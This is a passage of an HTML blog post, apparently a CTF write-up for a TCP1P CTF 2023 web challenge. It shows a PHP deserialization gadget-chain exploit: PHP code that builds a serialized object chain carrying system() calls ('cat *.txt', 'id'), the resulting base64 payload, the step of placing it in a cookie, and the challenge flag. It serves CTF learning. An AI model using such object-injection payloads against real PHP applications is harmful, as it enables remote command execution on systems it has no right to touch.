            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">

            <strong class="text-primary dark:text-white">
              setAccessible() â†’
            </strong> Make the property/variable accessible.
            </p>
            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">

            <strong class="text-primary dark:text-white">
              setValue() â†’
            </strong> Set the value for the property/variable.
            </p>
            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">

            <strong class="text-primary dark:text-white">
              Running the code above, will generate the payload in base64-encoded form:
            </strong>
            </p><pre><code class="language-php">TzoxNzoiR2FkZ2V0VHdvXEVjaG9lcnMiOjE6e3M6ODoiACoAa2xhc3MiO086MTY6IkdhZGdldE9uZVxBZGRlcnMiOjE6e3M6MTk6IgBHYWRnZXRPbmVcQWRkZXJzAHgiO086MTY6IkdhZGdldFRocmVlXFZ1bG4iOjQ6e3M6NDoid2FmMSI7aToxO3M6NzoiACoAd2FmMiI7czo0OiLerb7vIjtzOjIyOiIAR2FkZ2V0VGhyZWVcVnVsbgB3YWYzIjtiOjA7czozOiJjbWQiO3M6MjA6InN5c3RlbSgnY2F0ICoudHh0Jyk7Ijt9fX0=
</code></pre>
<hr>

            <h2 class="font-bold text-black dark:text-white font-xl sm:text-2xl lg:text-xl xl:text-2xl leading-tight sm:leading-tight lg:leading-tight xl:leading-tight mb-10">
              Approach 2 (credit to HeapCreate)
            </h2><pre><code class="language-php">&lt;?php

namespace GadgetOne {
    class Adders {
        private $x;
        function __construct($x) {
            $this-&gt;x = $x;
        }
    }
}

namespace GadgetTwo {
    class Echoers {
        protected $klass;
    }
}

namespace GadgetThree {
    class Vuln {
        public $waf1 = 1;
        protected $waf2 = &quot;\xde\xad\xbe\xef&quot;;
        private $waf3 = false;
        public $cmd = &quot;system(&#39;id&#39;);&quot;;
    }
}

namespace {
    $GadgetThree = new GadgetThree\Vuln();
    $GadgetOne = new GadgetOne\Adders($GadgetThree);
    $GadgetTwo = new GadgetTwo\Echoers();
    $reflectionClass = new ReflectionClass($GadgetTwo);
    $reflectionProperty = $reflectionClass-&gt;getProperty(&quot;klass&quot;);
    $reflectionProperty-&gt;setAccessible(true);
    $reflectionProperty-&gt;setValue($GadgetTwo, $GadgetOne);

    $serialized = base64_encode(serialize($GadgetTwo));
    echo $serialized.&quot;\n&quot;;
}
</code></pre>

            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">
              This is another approach by our new member
            <strong class="text-primary dark:text-white">

            <strong class="text-primary dark:text-white">
              HeapCreate
            </strong>
            </strong>. Works the same as above, but requires less usage of <code>ReflectionClass</code> and much more neater (imo).
            </p>
            <h2 class="font-bold text-black dark:text-white font-xl sm:text-2xl lg:text-xl xl:text-2xl leading-tight sm:leading-tight lg:leading-tight xl:leading-tight mb-10">
              Final steps
            </h2><hr>

            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">
              Pass the generated payload to
            <strong class="text-primary dark:text-white">
              <code>cookie</code>
            </strong> and you will get the flag!
            </p>
            <!-- <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">
              <img src="/images/ctfs/tcp1pctf2023-unsecure/Untitled%201.png" alt="Untitled">
            </p> -->
            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">

            <strong class="text-primary dark:text-white">
              Flag:
            </strong> <code>TCP1P{unserialize in php go brrrrrrrr ouch}</code>
            </p>
            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">

            <strong class="text-primary dark:text-white">
              Thanks for reading my write-up and have a nice day!
            </strong>
            </p>

              <div class="sm:flex items-center justify-between">
                <div class="mb-5">
                  <h5 class="font-medium text-body-color text-sm mb-3">Popular Tags :</h5>
                  <div class="flex items-center">
                    <a href="javascript:void(0)" class="inline-flex items-center justify-center py-2 px-4 mr-4 rounded-md bg-primary bg-opacity-10 text-body-color hover:bg-opacity-100 hover:text-white">WEB</a><a href="javascript:void(0)" class="inline-flex items-center justify-center py-2 px-4 mr-4 rounded-md bg-primary bg-opacity-10 text-body-color hover:bg-opacity-100 hover:text-white">TCP1PCTF</a><a href="javascript:void(0)" class="inline-flex items-center justify-center py-2 px-4 mr-4 rounded-md bg-primary bg-opacity-10 text-body-color hover:bg-opacity-100 hover:text-white">2023</a>
                  </div>
                </div>
                <div class="mb-5">
                  <h5 class="font-medium text-body-color text-sm sm:text-right mb-3">Share this post :</h5>
                  <div class="flex items-center sm:justify-end">
                    <a href="javascript:void(0)"
                      class="inline-flex items-center justify-center w-9 h-9 sm:ml-3 rounded-md bg-primary bg-opacity-10 text-body-color hover:bg-opacity-100 hover:text-white">
                      <svg width="16" height="16" viewBox="0 0 16 16" class="fill-current">
                        <path
                          d="M14.3442 0H1.12455C0.499798 0 0 0.497491 0 1.11936V14.3029C0 14.8999 0.499798 15.4222 1.12455 15.4222H14.2942C14.919 15.4222 15.4188 14.9247 15.4188 14.3029V1.09448C15.4688 0.497491 14.969 0 14.3442 0ZM4.57316 13.1089H2.29907V5.7709H4.57316V13.1089ZM3.42362 4.75104C2.67392 4.75104 2.09915 4.15405 2.09915 3.43269C2.09915 2.71133 2.69891 2.11434 3.42362 2.11434C4.14833 2.11434 4.74809 2.71133 4.74809 3.43269C4.74809 4.15405 4.19831 4.75104 3.42362 4.75104ZM13.1947 13.1089H10.9206V9.55183C10.9206 8.7061 10.8956 7.58674 9.72108 7.58674C8.52156 7.58674 8.34663 8.53198 8.34663 9.47721V13.1089H6.07255V5.7709H8.29665V6.79076H8.32164C8.64651 6.19377 9.37122 5.59678 10.4958 5.59678C12.8198 5.59678 13.2447 7.08925 13.2447 9.12897V13.1089H13.1947Z" />
                      </svg>
                    </a>
                    <a href="javascript:void(0)"
                      class="inline-flex items-center justify-center w-9 h-9 ml-3 rounded-md bg-primary bg-opacity-10 text-body-color hover:bg-opacity-100 hover:text-white">
                      <svg width="18" height="14" viewBox="0 0 18 14" class="fill-current">
                        <path
                          d="M15.5524 2.26027L16.625 1.0274C16.9355 0.693493 17.0202 0.436644 17.0484 0.308219C16.2016 0.770548 15.4113 0.924658 14.9032 0.924658H14.7056L14.5927 0.821918C13.9153 0.282534 13.0685 0 12.1653 0C10.1895 0 8.6371 1.48973 8.6371 3.21062C8.6371 3.31336 8.6371 3.46747 8.66532 3.57021L8.75 4.0839L8.15726 4.05822C4.54435 3.95548 1.58065 1.13014 1.10081 0.642123C0.310484 1.92637 0.762097 3.15925 1.24194 3.92979L2.20161 5.36815L0.677419 4.5976C0.705645 5.67637 1.15726 6.52397 2.03226 7.14041L2.79435 7.65411L2.03226 7.93665C2.5121 9.24658 3.58468 9.78596 4.375 9.99144L5.41935 10.2483L4.43145 10.8647C2.85081 11.8921 0.875 11.8151 0 11.738C1.77823 12.8682 3.89516 13.125 5.3629 13.125C6.46371 13.125 7.28226 13.0223 7.47984 12.9452C15.3831 11.25 15.75 4.82877 15.75 3.54452V3.36473L15.9194 3.26199C16.879 2.44007 17.2742 2.00342 17.5 1.74658C17.4153 1.77226 17.3024 1.82363 17.1895 1.84932L15.5524 2.26027Z" />
                      </svg>
                    </a>
                    <a href="javascript:void(0)"
                      class="inline-flex items-center justify-center w-9 h-9 ml-3 rounded-md bg-primary bg-opacity-10 text-body-color hover:bg-opacity-100 hover:text-white">
                      <svg width="9" height="18" viewBox="0 0 9 18" class="fill-current">
                        <path
                          d="M8.13643 7H6.78036H6.29605V6.43548V4.68548V4.12097H6.78036H7.79741C8.06378 4.12097 8.28172 3.89516 8.28172 3.55645V0.564516C8.28172 0.254032 8.088 0 7.79741 0H6.02968C4.11665 0 2.78479 1.58064 2.78479 3.92339V6.37903V6.94355H2.30048H0.65382C0.314802 6.94355 0 7.25403 0 7.70564V9.7379C0 10.1331 0.266371 10.5 0.65382 10.5H2.25205H2.73636V11.0645V16.7379C2.73636 17.1331 3.00273 17.5 3.39018 17.5H5.66644C5.81174 17.5 5.93281 17.4153 6.02968 17.3024C6.12654 17.1895 6.19919 16.9919 6.19919 16.8226V11.0927V10.5282H6.70771H7.79741C8.11222 10.5282 8.35437 10.3024 8.4028 9.96371V9.93548V9.90726L8.74182 7.95968C8.76604 7.7621 8.74182 7.53629 8.59653 7.31048C8.54809 7.16935 8.33016 7.02823 8.13643 7Z" />
                      </svg>
                    </a>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </section>
  <!-- ====== Blog Section End -->

